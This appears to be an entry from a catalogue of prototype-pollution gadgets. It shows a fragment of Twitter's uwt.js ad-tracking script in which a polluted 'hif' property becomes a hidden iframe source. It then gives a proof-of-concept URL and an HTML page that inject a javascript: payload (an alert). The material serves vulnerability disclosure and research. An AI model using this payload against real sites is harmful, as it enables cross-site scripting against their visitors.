## Twitter Universal Website Tag

URL: https://static.ads-twitter.com/uwt.js

### Vulnerable code fragment
```js
loadPixels: function(e) {
  var t, n;
  "hif" in e && (t = e.hif, t.forEach(twttr.conversion.buildIframe)), "tags" in e && (n = e.tags, n.forEach(twttr.conversion.buildPixel))
}
...
buildIframe: function(t) {
  if (twttr.conversion.cs) {
    twttr.conversion.cs = !1;
    var n = document.createElement("iframe");
    n.src = t, 
    n.hidden = !0, 
    e(window, function() {
      document.body.appendChild(n)
    })
  }
},
```

### PoC
```
?__proto__[hif][]=javascript:alert(document.domain)
```

```html
<script>
  Object.prototype.hif = ['javascript:alert(document.domain)'];
</script>

<script>
!function(e,t,n,s,u,a){e.twq||(s=e.twq=function(){s.exe?s.exe.apply(s,arguments):s.queue.push(arguments);
},s.version='1.1',s.queue=[],u=t.createElement(n),u.async=!0,u.src='https://static.ads-twitter.com/uwt.js',
a=t.getElementsByTagName(n)[0],a.parentNode.insertBefore(u,a))}(window,document,'script');

twq('init','twitter_pixel_id');
twq('track', 'PageView');
</script>
```